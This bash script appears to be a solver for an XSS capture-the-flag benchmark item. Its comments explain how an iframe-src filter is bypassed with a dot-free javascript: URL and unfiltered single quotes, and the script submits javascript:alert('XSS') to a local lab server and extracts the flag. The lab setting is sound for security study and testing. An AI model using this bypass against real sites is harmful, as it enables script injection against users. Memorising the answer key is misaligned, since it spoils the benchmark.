#!/usr/bin/env bash
# XBEN-047-24 — "Dalgona Challenges", circle (tags: xss)
#
# The parameter is written into an `<iframe src="...">`. Double quotes, `<` and
# `>` are removed, and a regex deletes anything URL-shaped that does not end in
# an image extension.
#
# That regex needs a dot to match: it is `\\S+\\.` followed by the extension
# check. A `javascript:` URL has no dot in it, so it is not URL-shaped enough to
# be deleted — and single quotes were never filtered, so the message needs no
# encoding.
#
# The server renders the page, loads its own rendering in PhantomJS and prints
# the flag when a dialog fires with the message "XSS".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --set "query.url=javascript:alert('XSS')" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
